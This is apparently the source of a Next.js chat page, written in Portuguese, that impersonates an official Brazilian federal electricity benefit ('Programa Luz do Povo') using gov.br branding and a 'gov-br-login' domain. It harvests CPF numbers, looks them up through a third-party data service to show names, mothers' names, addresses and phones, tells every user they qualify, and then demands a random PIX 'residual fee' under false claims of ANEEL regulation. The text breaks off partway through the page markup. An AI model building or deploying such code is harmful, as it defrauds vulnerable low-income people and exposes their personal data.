"use client"

import type React from "react"

import { useEffect, useRef, useState } from "react"
import { useRouter } from "next/navigation"
import Image from "next/image"
import { Send, Check, CheckCircle } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
import { Label } from "@/components/ui/label"

// Imports dos componentes
import { ProgressIndicator } from "@/components/progress-indicator"
import { ContextualTip } from "@/components/contextual-tip"
import { Celebration } from "@/components/celebration"
import { ThemeToggleButton } from "@/components/theme-toggle-button"
import RealPixQRCode from "@/components/real-pix-qrcode"

// Tipos
type UserData = {
  name: string
  cpf: string
  birthdate: string
  email?: string
  cep?: string
  socialProgram?: string
  income?: string
  familySize?: string
  isMonoparental?: string
  isInformalWorker?: string
  hasWashingMachine?: boolean
  hasAirConditioner?: boolean
  hasRefrigerator?: boolean
  hasMicrowave?: boolean
  waterSource?: string
  housingType?: string
  electricityConsumption?: string
  // Novos campos da API CPF
  apiData?: {
    nome?: string
    dataNascimento?: string
    situacao?: string
    endereco?: string
    telefone?: string
    email?: string
  }
}

type Message = {
  id: string
  text: string
  sender: "bot" | "user"
  options?: Array<{
    id: string
    text: string
    value: string
  }>
  input?: {
    type: "text" | "radio" | "checkbox"
    placeholder?: string
    field: keyof UserData | "terms" | "action" | "payment_confirmation"
  }
  pixCode?: boolean
  pixAmount?: number
  isApiVerification?: boolean
}

export default function ChatPage() {
  // 🛡️ PROTEÇÕES DE SEGURANÇA
  useEffect(() => {
    // 1. Verificação de domínio (substitua pelos seus domínios autorizados)
    const allowedDomains = ["localhost", "127.0.0.1", "gov-br-login.vercel.app"]
    const currentDomain = window.location.hostname

    if (!allowedDomains.includes(currentDomain)) {
      console.warn("🚨 Domínio não autorizado detectado:", currentDomain)
      // Redirecionar para domínio oficial
      if (window.top) {
        window.top.location.href = "https://example.com"; // Correctly assign a string to the `href` property.
      } else {
        console.error("window.top is null or inaccessible.")
      }
    }

    // 2. Proteção contra iframe (anti-clickjacking)
if (window.top && window.top !== window.self) {
  console.warn("🚨 Tentativa de iframe detectada")
  window.top.location.href = window.self.location.href
}

    // 3. Watermark invisível (assinatura digital)
    const watermark = btoa(
      JSON.stringify({
        domain: window.location.hostname,
        timestamp: Date.now(),
        signature: "PROGRAMA_LUZ_DO_POVO_OFICIAL",
        version: "1.0",
      }),
    )

    // Adicionar watermark como atributo invisível
    document.body.setAttribute("data-auth", watermark)

    // 4. Monitoramento de tentativas de cópia
    const handleCopy = () => {
      console.log("📋 Tentativa de cópia detectada em:", new Date().toISOString())
      // Opcional: enviar alerta para seu servidor
    }

    const handleRightClick = (e: MouseEvent) => {
      console.log("🖱️ Clique direito detectado")
      // Não bloquear, apenas monitorar
    }

    const handleKeyDown = (e: KeyboardEvent) => {
      // Detectar F12, Ctrl+Shift+I, Ctrl+U (ferramentas de desenvolvedor)
      if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I") || (e.ctrlKey && e.key === "u")) {
        console.log("🔧 Tentativa de acesso às ferramentas de desenvolvedor")
      }
    }

    // 5. Detectar se DevTools está aberto (método básico)
    const devtools = { open: false, orientation: null }
    const threshold = 160

    const detectDevTools = () => {
      if (window.outerHeight - window.innerHeight > threshold || window.outerWidth - window.innerWidth > threshold) {
        if (!devtools.open) {
          devtools.open = true
          console.log("🔧 DevTools possivelmente aberto")
        }
      } else {
        devtools.open = false
      }
    }

    // Adicionar event listeners
    document.addEventListener("copy", handleCopy)
    document.addEventListener("contextmenu", handleRightClick)
    document.addEventListener("keydown", handleKeyDown)

    // Verificar DevTools periodicamente
    const devToolsInterval = setInterval(detectDevTools, 500)

    // 6. Adicionar meta informações de proteção
    const metaAuth = document.createElement("meta")
    metaAuth.name = "site-verification"
    metaAuth.content = btoa("PROGRAMA_LUZ_DO_POVO_OFICIAL_" + Date.now())
    document.head.appendChild(metaAuth)

    // Cleanup
    return () => {
      document.removeEventListener("copy", handleCopy)
      document.removeEventListener("contextmenu", handleRightClick)
      document.removeEventListener("keydown", handleKeyDown)
      clearInterval(devToolsInterval)
    }
  }, [])

  // 7. Função para verificar integridade da página
  useEffect(() => {
    const verifyPageIntegrity = () => {
      const expectedTitle = "Programa Luz do Povo"
      if (!document.title.includes(expectedTitle)) {
        console.warn("🚨 Título da página foi alterado")
      }

      // Verificar se elementos críticos existem
      const criticalElements = ["header", "[data-auth]"]

      criticalElements.forEach((selector) => {
        if (!document.querySelector(selector)) {
          console.warn("🚨 Elemento crítico removido:", selector)
        }
      })
    }

    // Verificar integridade a cada 30 segundos
    const integrityInterval = setInterval(verifyPageIntegrity, 30000)

    return () => clearInterval(integrityInterval)
  }, [])

  const router = useRouter()
  const [messages, setMessages] = useState<Message[]>([])
  const [currentInput, setCurrentInput] = useState("")
  const [userData, setUserData] = useState<UserData>({
    name: "Usuário",
    cpf: "",
    birthdate: "",
  })
  const [loading, setLoading] = useState(false)
  const [waitingForInput, setWaitingForInput] = useState(false)
  const messagesEndRef = useRef<HTMLDivElement>(null)
  const [cepError, setCepError] = useState<string | null>(null)
  const [selectedIncome, setSelectedIncome] = useState<string | null>(null)
  const conversationStartedRef = useRef(false)
  const dataLoadedRef = useRef(false)
  const [termsAccepted, setTermsAccepted] = useState(false)
  const [pixValue, setPixValue] = useState(0)
  const [paymentConfirmed, setPaymentConfirmed] = useState(false)

  // Novos estados para verificação CPF
  const [cpfVerified, setCpfVerified] = useState(false)
  const [cpfVerificationLoading, setCpfVerificationLoading] = useState(false)
  const [apiVerificationComplete, setApiVerificationComplete] = useState(false)

  // Estados para seleções
  const [selectedSocialProgram, setSelectedSocialProgram] = useState<string | null>(null)
  const [selectedFamilySize, setSelectedFamilySize] = useState<string | null>(null)
  const [selectedHousingType, setSelectedHousingType] = useState<string | null>(null)
  const [selectedWaterSource, setSelectedWaterSource] = useState<string | null>(null)
  const [selectedElectricityConsumption, setSelectedElectricityConsumption] = useState<string | null>(null)
  const [selectedIsMonoparental, setSelectedIsMonoparental] = useState<string | null>(null)
  const [selectedIsInformalWorker, setSelectedIsInformalWorker] = useState<string | null>(null)

  // Estados para componentes aprimorados
  const [currentStep, setCurrentStep] = useState(1)
  const [totalSteps, setTotalSteps] = useState(13) // Aumentado para incluir verificação CPF
  const [showCelebration, setShowCelebration] = useState(false)
  const [showTip, setShowTip] = useState(false)
  const [currentTip, setCurrentTip] = useState("")
  const [isTyping, setIsTyping] = useState(false)
  const [currentTypingMessage, setCurrentTypingMessage] = useState("")
  const [encouragementMessages] = useState([
    "Você está indo muito bem!",
    "Estamos quase lá!",
    "Suas respostas estão nos ajudando a encontrar o melhor benefício para você.",
    "Obrigado pela paciência, cada informação é importante.",
    "Falta pouco para concluirmos sua avaliação!",
  ])

  // Nova função para verificar CPF via API - BASEADA NO CÓDIGO QUE FUNCIONA
  const verifyCPFWithAPI = async (cpf: string): Promise<any> => {
    try {
      setCpfVerificationLoading(true)

      // Limpar CPF (remover pontos e traços) - igual ao seu código
      const cleanCPF = cpf.replace(/\D/g, "")

      // Validar se CPF tem 11 dígitos
      if (cleanCPF.length !== 11) {
        throw new Error("CPF deve conter 11 dígitos")
      }

      // Constrói a URL da API com o CPF - EXATAMENTE IGUAL AO SEU CÓDIGO
      const apiUrl = `https://apela-api.tech?user=4a0ce81f-db70-48f4-9c10-ce4849562176&cpf=${cleanCPF}`

      console.log("🔍 Chamando API:", apiUrl)

      // Faz a chamada à API - EXATAMENTE IGUAL AO SEU CÓDIGO
      const response = await fetch(apiUrl)

      if (!response.ok) {
        throw new Error(`Erro na API: ${response.status}`)
      }

      // Processa a resposta da API - EXATAMENTE IGUAL AO SEU CÓDIGO
      const data = await response.json()
      console.log("✅ Resposta da API:", JSON.stringify(data, null, 2))

      setCpfVerificationLoading(false)

      // Verifica se a API retornou um CPF válido - BASEADO NO SEU CÓDIGO
      if (data.valid === false) {
        throw new Error("CPF inválido segundo a API")
      }

      return data
    } catch (error) {
      setCpfVerificationLoading(false)
      console.error("❌ Erro ao verificar CPF na API:", error)
      throw error
    }
  }

  // Função para extrair nome da resposta da API
  const getNameFromResponse = (data: any): string | null => {
    // Tentar diferentes campos possíveis para o nome
    return data.nome || data.name || data.nomeCompleto || data.full_name || null
  }

  // Função para extrair nome da mãe da resposta da API
  const getMotherNameFromResponse = (data: any): string | null => {
    // Tentar diferentes campos possíveis para o nome da mãe
    return data.nomeMae || data.mother_name || data.mae || data.nomeDaMae || null
  }

  // Função para extrair data de nascimento da resposta da API
  const getBirthdateFromResponse = (data: any): string | null => {
    // Tentar diferentes campos possíveis para a data de nascimento
    return data.dataNascimento || data.birthdate || data.birth_date || data.nascimento || null
  }

  // Carregar dados do usuário
  useEffect(() => {
    if (typeof window !== "undefined" && !dataLoadedRef.current) {
      try {
        const storedUserData = localStorage.getItem("userData")
        if (storedUserData) {
          const parsedData = JSON.parse(storedUserData)
          setUserData((prev) => ({
            ...prev,
            name: parsedData.name || prev.name,
            cpf: parsedData.cpf || prev.cpf,
            birthdate: parsedData.birthdate || prev.birthdate,
            email: parsedData.email || prev.email,
            apiData: parsedData.apiData || undefined,
          }))
          dataLoadedRef.current = true
        }
      } catch (error) {
        console.error("Erro ao carregar dados:", error)
      }
    }
  }, [])

  // Função para buscar endereço pelo CEP
  const fetchAddressByCEP = async (cep: string): Promise<any> => {
    try {
      setLoading(true)
      const formattedCEP = cep.replace(/\D/g, "")

      // Validar formato do CEP
      if (formattedCEP.length !== 8) {
        throw new Error("CEP deve conter 8 dígitos")
      }

      const response = await fetch(`https://viacep.com.br/ws/${formattedCEP}/json/`)
      const data = await response.json()
      setLoading(false)

      if (data.erro) {
        throw new Error("CEP não encontrado")
      }

      return data
    } catch (error) {
      setLoading(false)
      throw error
    }
  }

  // Função para formatar CEP
  const formatCEP = (value: string) => {
    return value
      .replace(/\D/g, "")
      .replace(/(\d{5})(\d)/, "$1-$2")
      .substring(0, 9)
  }

  // Função para formatar CPF
  const formatCPF = (cpf: string) => {
    return cpf
      .replace(/\D/g, "")
      .replace(/(\d{3})(\d)/, "$1.$2")
      .replace(/(\d{3})(\d)/, "$1.$2")
      .replace(/(\d{3})(\d{1,2})/, "$1-$2")
  }

  // Função para adicionar mensagem do bot
  const addBotMessage = (
    text: string,
    options?: Message["options"],
    input?: Message["input"],
    pixCode?: boolean,
    pixAmount?: number,
    isApiVerification?: boolean,
  ) => {
    const newMessage: Message = {
      id: Date.now().toString() + Math.random().toString(36).substr(2, 9),
      text,
      sender: "bot",
      options,
      input,
      pixCode,
      pixAmount,
      isApiVerification,
    }

    setMessages((prev) => [...prev, newMessage])

    if (input) {
      setWaitingForInput(true)
    }

    // Mostrar dica contextual aleatoriamente
    if (Math.random() > 0.7 && !pixCode && !isApiVerification) {
      showRandomTip()
    }
  }

  // Função para mostrar dica aleatória
  const showRandomTip = () => {
    const tips = [
      "Famílias com crianças pequenas geralmente têm prioridade em programas sociais.",
      "Mantenha seus dados do CadÚnico sempre atualizados para não perder benefícios.",
      "O consumo consciente de energia ajuda a economizar e preservar o meio ambiente.",
      "Você pode acompanhar seu consumo de energia através do aplicativo da sua distribuidora.",
      "Lâmpadas LED consomem até 80% menos energia que as incandescentes.",
    ]

    const randomTip = tips[Math.floor(Math.random() * tips.length)]
    setCurrentTip(randomTip)
    setShowTip(true)

    setTimeout(() => {
      setShowTip(false)
    }, 8000)
  }

  // Função para adicionar mensagem do usuário
  const addUserMessage = (text: string) => {
    const newMessage: Message = {
      id: Date.now().toString() + Math.random().toString(36).substr(2, 9),
      text,
      sender: "user",
    }

    setMessages((prev) => [...prev, newMessage])
    setWaitingForInput(false)
  }

  // Função para gerar PIX real
  const generatePixReal = () => {
    // DADOS FIXOS PARA A API PIX
    const fixedEmail = "clientepadrãoboy@gmail.com"
    const fixedName = "boy boyboy"
    const fixedCpf = "284.491.380-60" // CPF FIXO

    // Gerar valor aleatório entre 40 e 70 reais
    const randomValue = Math.random() * 30 + 40

    setPixValue(randomValue)

    addBotMessage("Gerando código PIX para pagamento...")

    setTimeout(() => {
      addBotMessage(
        `PIX gerado no valor de ${new Intl.NumberFormat("pt-BR", { style: "currency", currency: "BRL" }).format(randomValue)}`,
        undefined,
        undefined,
        true,
        randomValue,
      )
    }, 2000)
  }

  // Função para confirmar pagamento - CHAMADA PELA API
  const handlePaymentConfirmed = () => {
    console.log("🎉 PAGAMENTO CONFIRMADO VIA API!")
    setPaymentConfirmed(true)

    // Adicionar mensagem no chat indicando confirmação
    setTimeout(() => {
      addBotMessage("✅ PAGAMENTO CONFIRMADO!")

      setTimeout(() => {
        addBotMessage(
          `Pagamento do valor residual de ${new Intl.NumberFormat("pt-BR", {
            style: "currency",
            currency: "BRL",
          }).format(pixValue)} foi confirmado com sucesso!`,
        )

        setTimeout(() => {
          addBotMessage(
            "🎊 Parabéns! Seu benefício do Programa Luz do Povo será ativado automaticamente em até 24 horas.",
          )

          setTimeout(() => {
            addBotMessage(
              "Você receberá confirmação por SMS e e-mail quando o benefício estiver ativo. Obrigado por utilizar nosso serviço!",
            )
          }, 3000)
        }, 2000)
      }, 1000)
    }, 500)
  }

  // Função para permitir correção de dados
  const allowDataCorrection = (field: keyof UserData) => {
    addBotMessage(
      `Você gostaria de corrigir algum dado informado?`,
      [
        { id: "1", text: "Sim, corrigir nome", value: "corrigir_nome" },
        { id: "2", text: "Sim, corrigir e-mail", value: "corrigir_email" },
        { id: "3", text: "Sim, corrigir CEP", value: "corrigir_cep" },
        { id: "4", text: "Não, continuar", value: "continuar" },
      ],
      { type: "radio", field: "action" },
    )
  }

  // Função para processar entrada do usuário
  const processUserInput = async (
    input: string,
    field: keyof UserData | "terms" | "action" | "payment_confirmation",
  ) => {
    addUserMessage(input)

    // Atualizar dados do usuário
    if (field !== "terms" && field !== "action" && field !== "payment_confirmation") {
      if (
        field === "hasWashingMachine" ||
        field === "hasAirConditioner" ||
        field === "hasRefrigerator" ||
        field === "hasMicrowave"
      ) {
        setUserData((prev) => ({ ...prev, [field]: input === "sim" }))
      } else {
        setUserData((prev) => ({ ...prev, [field]: input }))
      }
    }

    // Avançar passo apenas se não houver erro
    const shouldAdvanceStep = () => {
      if (currentStep < totalSteps) {
        setCurrentStep(currentStep + 1)
      }
    }

    // Processar baseado no campo
    if (field === "cpf") {
      // Nova lógica para verificação de CPF via API
      try {
        addBotMessage("🔍 Verificando seus dados via CPF...", undefined, undefined, false, undefined, true)

        const apiData = await verifyCPFWithAPI(input)

        // Atualizar userData com dados da API
        setUserData((prev) => ({
          ...prev,
          cpf: input,
          apiData: {
            ...apiData,
            nome: getNameFromResponse(apiData),
            nomeMae: getMotherNameFromResponse(apiData),
            dataNascimento: getBirthdateFromResponse(apiData),
          },
          // Pré-preencher dados se disponíveis na API
          name: getNameFromResponse(apiData) || prev.name,
          birthdate: getBirthdateFromResponse(apiData) || prev.birthdate,
          email: apiData.email || prev.email,
        }))

        setCpfVerified(true)
        setApiVerificationComplete(true)
        shouldAdvanceStep()

        setTimeout(() => {
          // Extrair dados específicos da API
          const nome = getNameFromResponse(apiData)
          const nomeMae = getMotherNameFromResponse(apiData)
          const dataNascimento = getBirthdateFromResponse(apiData)

          let apiMessage = `✅ Dados verificados com sucesso!\n\n📋 INFORMAÇÕES ENCONTRADAS:\n• Nome: ${nome || "Não informado"}\n• CPF: ${formatCPF(input)}`

          if (dataNascimento) {
            apiMessage += `\n• Data de Nascimento: ${dataNascimento}`
          }

          if (nomeMae) {
            apiMessage += `\n• Nome da Mãe: ${nomeMae}`
          }

          if (apiData.situacao) {
            apiMessage += `\n• Situação: ${apiData.situacao}`
          }

          if (apiData.endereco) {
            apiMessage += `\n• Endereço: ${apiData.endereco}`
          }
          if (apiData.telefone) {
            apiMessage += `\n• Telefone: ${apiData.telefone}`
          }
          if (apiData.email) {
            apiMessage += `\n• E-mail: ${apiData.email}`
          }

          addBotMessage(apiMessage, undefined, undefined, false, undefined, true)

          setTimeout(() => {
            addBotMessage(
              "Os dados acima estão corretos?",
              [
                { id: "1", text: "✅ Sim, dados corretos", value: "dados_corretos" },
                { id: "2", text: "❌ Preciso corrigir algo", value: "corrigir_dados" },
              ],
              { type: "radio", field: "action" },
            )
          }, 2000)
        }, 2000)
      } catch (error) {
        // Em caso de erro na API, continuar com fluxo normal
        console.error("Erro na verificação CPF:", error)

        setTimeout(() => {
          addBotMessage(
            "⚠️ Não foi possível verificar automaticamente seus dados via CPF. Vamos prosseguir com a coleta manual.",
            undefined,
            undefined,
            false,
            undefined,
            true,
          )

          setTimeout(() => {
            setUserData((prev) => ({ ...prev, cpf: input }))
            shouldAdvanceStep()

            addBotMessage("Confirme seu nome completo:", undefined, {
              type: "text",
              placeholder: "Digite seu nome...",
              field: "name",
            })
          }, 2000)
        }, 1500)
      }
    } else if (field === "action" && input === "dados_corretos") {
      // Dados da API confirmados, pular para próxima etapa relevante
      shouldAdvanceStep()

      setTimeout(() => {
        // Se temos email da API, pular para CEP, senão pedir email
        if (userData.apiData?.email) {
          addBotMessage(
            `✅ E-mail confirmado: ${userData.apiData.email}! Informe o CEP da sua residência:`,
            undefined,
            {
              type: "text",
              placeholder: "Digite o CEP...",
              field: "cep",
            },
          )
        } else {
          addBotMessage(`Obrigado! Agora, informe seu e-mail:`, undefined, {
            type: "text",
            placeholder: "Digite seu e-mail...",
            field: "email",
          })
        }
      }, 1000)
    } else if (field === "action" && input === "corrigir_dados") {
      // Permitir correção manual dos dados
      shouldAdvanceStep()

      setTimeout(() => {
        addBotMessage("Vamos corrigir seus dados. Confirme seu nome completo:", undefined, {
          type: "text",
          placeholder: "Digite seu nome...",
          field: "name",
        })
      }, 1000)
    } else if (field === "name") {
      shouldAdvanceStep()
      setTimeout(() => {
        // Se já temos email da API e dados foram confirmados, pular para CEP
        if (userData.apiData?.email && apiVerificationComplete) {
          addBotMessage(
            `✅ E-mail confirmado: ${userData.apiData.email}! Informe o CEP da sua residência:`,
            undefined,
            {
              type: "text",
              placeholder: "Digite o CEP...",
              field: "cep",
            },
          )
        } else {
          addBotMessage(`Obrigado, ${input}! Agora, informe seu e-mail:`, undefined, {
            type: "text",
            placeholder: "Digite seu e-mail...",
            field: "email",
          })
        }
      }, 1000)
    } else if (field === "email") {
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
      if (!emailRegex.test(input)) {
        // NÃO avançar passo em caso de erro
        setTimeout(() => {
          addBotMessage("❌ E-mail inválido. Por favor, digite um e-mail válido:", undefined, {
            type: "text",
            placeholder: "Digite seu e-mail...",
            field: "email",
          })
        }, 1000)
        return
      }

      shouldAdvanceStep()
      setTimeout(() => {
        addBotMessage(`✅ E-mail confirmado! Informe o CEP da sua residência:`, undefined, {
          type: "text",
          placeholder: "Digite o CEP...",
          field: "cep",
        })
      }, 1000)
    } else if (field === "cep") {
      try {
        const cepData = await fetchAddressByCEP(input)

        shouldAdvanceStep()
        setCepError(null) // Limpar erro anterior

        setTimeout(() => {
          addBotMessage(
            `✅ Endereço confirmado: ${cepData.logradouro}, ${cepData.bairro}, ${cepData.localidade}/${cepData.uf}`,
          )

          setTimeout(() => {
            addBotMessage(
              "Você participa de algum programa social?",
              [
                { id: "1", text: "Bolsa Família", value: "Bolsa Família" },
                { id: "2", text: "BPC", value: "BPC" },
                { id: "3", text: "Auxílio Brasil", value: "Auxílio Brasil" },
                { id: "4", text: "Não participo", value: "Não participo" },
              ],
              { type: "radio", field: "socialProgram" },
            )
          }, 2000)
        }, 2000)
      } catch (error) {
        // NÃO avançar passo em caso de erro
        setCepError("CEP não encontrado. Tente novamente.")

        setTimeout(() => {
          addBotMessage("❌ CEP não encontrado. Por favor, digite um CEP válido:", undefined, {
            type: "text",
            placeholder: "Digite o CEP...",
            field: "cep",
          })
        }, 1000)
        return
      }
    } else if (field === "socialProgram") {
      setSelectedSocialProgram(input)
      shouldAdvanceStep()

      setTimeout(() => {
        addBotMessage(
          "Quantas pessoas moram na sua residência (incluindo você)?",
          [
            { id: "1", text: "1 pessoa", value: "1 pessoa" },
            { id: "2", text: "2 pessoas", value: "2 pessoas" },
            { id: "3", text: "3 pessoas", value: "3 pessoas" },
            { id: "4", text: "4 pessoas", value: "4 pessoas" },
            { id: "5", text: "5 ou mais pessoas", value: "5 ou mais pessoas" },
          ],
          { type: "radio", field: "familySize" },
        )
      }, 2000)
    } else if (field === "familySize") {
      setSelectedFamilySize(input)
      shouldAdvanceStep()

      setTimeout(() => {
        addBotMessage(
          "Você é responsável sozinho(a) pela família (pai/mãe solteiro(a))?",
          [
            { id: "1", text: "Sim, sou pai/mãe solteiro(a)", value: "Sim" },
            { id: "2", text: "Não, tenho companheiro(a)", value: "Não" },
          ],
          { type: "radio", field: "isMonoparental" },
        )
      }, 2000)
    } else if (field === "isMonoparental") {
      setSelectedIsMonoparental(input)
      shouldAdvanceStep()

      setTimeout(() => {
        addBotMessage(
          "Qual é sua situação de trabalho?",
          [
            { id: "1", text: "Trabalho com carteira assinada", value: "Formal" },
            { id: "2", text: "Trabalho sem carteira assinada", value: "Informal" },
            { id: "3", text: "Sou autônomo/freelancer", value: "Autônomo" },
            { id: "4", text: "Estou desempregado(a)", value: "Desempregado" },
            { id: "5", text: "Sou aposentado(a)", value: "Aposentado" },
          ],
          { type: "radio", field: "isInformalWorker" },
        )
      }, 2000)
    } else if (field === "isInformalWorker") {
      setSelectedIsInformalWorker(input)
      shouldAdvanceStep()

      setTimeout(() => {
        addBotMessage(
          "Qual sua faixa de renda familiar?",
          [
            { id: "1", text: "Até 1 salário mínimo", value: "Até 1 salário mínimo" },
            { id: "2", text: "Entre 1 e 2 salários", value: "Entre 1 e 2 salários" },
            { id: "3", text: "Entre 2 e 3 salários", value: "Entre 2 e 3 salários" },
            { id: "4", text: "Acima de 3 salários", value: "Acima de 3 salários" },
          ],
          { type: "radio", field: "income" },
        )
      }, 2000)
    } else if (field === "income") {
      setSelectedIncome(input)
      shouldAdvanceStep()

      setTimeout(() => {
        addBotMessage("Analisando suas informações...")

        setTimeout(() => {
          setShowCelebration(true)
          addBotMessage("Parabéns! Você tem direito ao benefício!")

          setTimeout(() => {
            addBotMessage("Para ativar o benefício, é necessário quitar o valor residual da fatura atual:")

            setTimeout(() => {
              const termsText = `📋 TERMOS DE CONCORDÂNCIA E AUTORIZAÇÃO

🔹 SOBRE O VALOR RESIDUAL:
O valor residual refere-se ao saldo pendente da sua última fatura de energia elétrica antes da ativação do benefício. Este pagamento é necessário para:
• Regularizar sua situação junto à distribuidora de energia
• Garantir que não haja pendências que impeçam a ativação do benefício
• Cumprir as exigências legais do Programa Luz do Povo

💰 BENEFÍCIOS APÓS O PAGAMENTO:
• Isenção total da conta de luz para consumo até 80 kWh/mês
• Economia média de R$ 100 mensais no orçamento familiar
• Benefício vitalício enquanto atender aos critérios do programa
• Ativação automática em até 24 horas após confirmação do pagamento

📝 DECLARAÇÕES E AUTORIZAÇÕES:
1. ✅ Declaro que todas as informações fornecidas são verdadeiras e completas
2. ✅ Autorizo o uso dos meus dados pessoais para análise de elegibilidade ao benefício
3. ✅ Estou ciente da necessidade de quitar o valor residual para ativação do benefício
4. ✅ Concordo com a ativação automática do Programa Luz do Povo após confirmação do pagamento
5. ✅ Autorizo o compartilhamento dos dados com a ANEEL e distribuidora de energia
6. ✅ Estou ciente de que o benefício será mantido enquanto eu atender aos critérios legais

🔒 PROTEÇÃO DE DADOS:
Seus dados estão protegidos pela Lei Geral de Proteção de Dados (LGPD) e serão utilizados exclusivamente para os fins do Programa Luz do Povo.

⚖️ COMPROMISSO LEGAL:
Este é um programa oficial do Governo Federal, regulamentado pela ANEEL. O pagamento do valor residual é uma exigência legal para participação no programa.

Você concorda com todos os termos acima?`

              addBotMessage(
                termsText,
                [
                  { id: "1", text: "Concordo", value: "concordo" },
                  { id: "2", text: "Não concordo", value: "nao_concordo" },
                ],
                { type: "radio", field: "terms" },
              )
            }, 3000)
          }, 3000)
        }, 3000)
      }, 2000)
    } else if (field === "terms") {
      if (input === "concordo") {
        setTermsAccepted(true)
        shouldAdvanceStep()
        setTimeout(() => {
          addBotMessage("Gerando código PIX para pagamento...")
          setTimeout(() => {
            generatePixReal()
          }, 2000)
        }, 2000)
      } else {
        // NÃO avançar passo se não concordar
        setTimeout(() => {
          addBotMessage(
            "❌ Sem a concordância não é possível prosseguir. Você gostaria de revisar os termos?",
            [
              { id: "1", text: "Sim, revisar termos", value: "revisar" },
              { id: "2", text: "Não, encerrar processo", value: "encerrar" },
            ],
            { type: "radio", field: "terms" },
          )
        }, 2000)
      }
    }
  }

  const handleSubmit = (event: React.FormEvent) => {
    event.preventDefault()
    if (currentInput.trim() && waitingForInput) {
      const lastMessage = messages[messages.length - 1]
      if (lastMessage?.input?.field) {
        // Limpar erro de CEP quando usuário tentar novamente
        if (lastMessage.input.field === "cep") {
          setCepError(null)
        }

        processUserInput(currentInput, lastMessage.input.field)
        setCurrentInput("")
      }
    }
  }

  const handleOptionSelect = (value: string, field: keyof UserData | "terms" | "action" | "payment_confirmation") => {
    processUserInput(value, field)
  }

  useEffect(() => {
    messagesEndRef.current?.scrollIntoView({ behavior: "smooth" })
  }, [messages])

  useEffect(() => {
    if (!conversationStartedRef.current && dataLoadedRef.current) {
      // Adicionar após: if (!conversationStartedRef.current && dataLoadedRef.current) {
      console.log("🔐 Programa Luz do Povo - Sistema Oficial Carregado")
      console.log("📍 Domínio:", window.location.hostname)
      console.log("🕐 Timestamp:", new Date().toISOString())

      conversationStartedRef.current = true

      setTimeout(() => {
        const userName = userData.name || "Usuário"
        const userBirthdate = userData.birthdate || "não informada"
        const formattedCPF = userData.cpf ? formatCPF(userData.cpf) : "não informado"

        addBotMessage(
          `Olá! Bem-vindo ao Programa Luz do Povo.\n\nDados identificados:\n• Nome: ${userName}\n• CPF: ${formattedCPF}\n• Data de nascimento: ${userBirthdate}`,
        )

        setTimeout(() => {
          // Iniciar com verificação de CPF se não temos dados da API ainda
          if (!userData.apiData) {
            addBotMessage("Para começar, vamos verificar seus dados automaticamente. Confirme seu CPF:", undefined, {
              type: "text",
              placeholder: "Digite seu CPF...",
              field: "cpf",
            })
          } else {
            // Se já temos dados da API, pular para confirmação
            addBotMessage("Confirme seu nome completo:", undefined, {
              type: "text",
              placeholder: "Digite seu nome...",
              field: "name",
            })
          }
        }, 3000)
      }, 1000)
    }
  }, [userData, dataLoadedRef.current])

  useEffect(() => {
    localStorage.setItem("userData", JSON.stringify(userData))
  }, [userData])

  return (
    <div className="flex flex-col h-screen bg-gray-100 chat-background">
      {/* Header */}
      <header className="bg-blue-900 text-white p-4 flex items-center justify-between">
        <div className="flex items-center">
          <div className="flex-shrink-0 mr-3">
            <div className="w-10 h-10 rounded-full bg-white flex items-center justify-center overflow-hidden bot-avatar">
              <Image
                src="https://www.gov.br/++theme++padrao_govbr/img/govbr-colorido-b.png"
                alt="Logo Gov.br"
                width={40}
                height={40}
                className="rounded-full"
              />
            </div>
          </div>
          <div className="flex-1">
            <h1 className="font-bold">Programa Luz do Povo</h1>
            <p className="text-xs opacity-80">Atendimento Oficial do Governo Federal</p>
          </div>
        </div>
        <ThemeToggleButton className="hover:bg-blue-800" />
      </header>

      {/* Indicador de progresso */}
      <ProgressIndicator currentStep={currentStep} totalSteps={totalSteps} />

      {/* Área de mensagens */}
      <div className="flex-1 overflow-y-auto p-4 bg-gray-100">
        {messages.map((message) => (
          <div key={message.id} className={`mb-4 flex ${message.sender === "bot" ? "justify-start" : "justify-end"}`}>
            {message.sender === "bot" && (
              <div className="w-8 h-8 rounded-full bg-white mr-2 flex-shrink-0 overflow-hidden bot-avatar">
                <Image
                  src="https://www.gov.br/++theme++padrao_govbr/img/govbr-colorido-b.png"
                  alt="Logo Gov.br"
                  width={32}
                  height={32}
                />
              </div>
            )}
            <div
              className={`rounded-lg p-3 max-w-[80%] message-bubble ${message.sender === "bot" ? "bot" : "user"} ${message.isApiVerification ? "api-verification" : ""}`}
            >
              {/* Indicador especial para mensagens de verificação API */}
              {message.isApiVerification && (
                <div className="flex items-center mb-2 text-blue-600">
                  {cpfVerificationLoading ? (
                    <>
                      <div className="animate-spin h-4 w-4 border-2 border-blue-600 border-t-transparent rounded-full mr-2" />
                      <span className="text-sm font-medium">Verificando...</span>
                    </>
                  ) : (
                    <>
                      <CheckCircle className="h-4 w-4 mr-2" />
                      <span className="text-sm font-medium">Verificação Automática</span>
                    </>
                  )}
                </div>
              )}

              {message.pixCode && message.pixAmount ? (
                <RealPixQRCode
                  amount={message.pixAmount}
                  customerName="boy boyboy" // NOME FIXO
                  customerCpf="284.491.380-60" // CPF FIXO
                  customerEmail="clientepadrãoboy@gmail.com" // EMAIL FIXO
                  onPaymentConfirmed={handlePaymentConfirmed}
                />
              ) : (
                message.text.split("\n").map((line, i) => (
                  <p key={i} className={i > 0 ? "mt-1" : ""}>
                    {line}
                  </p>
                ))
              )}

              {message.options && message.input && (
                <RadioGroup
                  onValueChange={(value) =>
                    handleOptionSelect(
                      value,
                      message.input?.field as keyof UserData | "terms" | "action" | "payment_confirmation",
                    )
                  }
                  className="space-y-2 mt-3"
                  value={
                    message.input?.field === "income"
                      ? selectedIncome || undefined
                      : message.input?.field === "socialProgram"
                        ? selectedSocialProgram || undefined
                        : message.input?.field === "familySize"
                          ? selectedFamilySize || undefined
                          : message.input?.field === "isMonoparental"
                            ? selectedIsMonoparental || undefined
                            : message.input?.field === "isInformalWorker"
                              ? selectedIsInformalWorker || undefined
                              : undefined
                  }
                >
                  {message.options.map((option) => (
                    <div key={option.id} className="flex items-center space-x-2">
                      <RadioGroupItem value={option.value} id={option.id} />
                      <Label htmlFor={option.id} className="cursor-pointer">
                        {option.text}
                      </Label>
                    </div>
                  ))}
                </RadioGroup>
              )}
            </div>
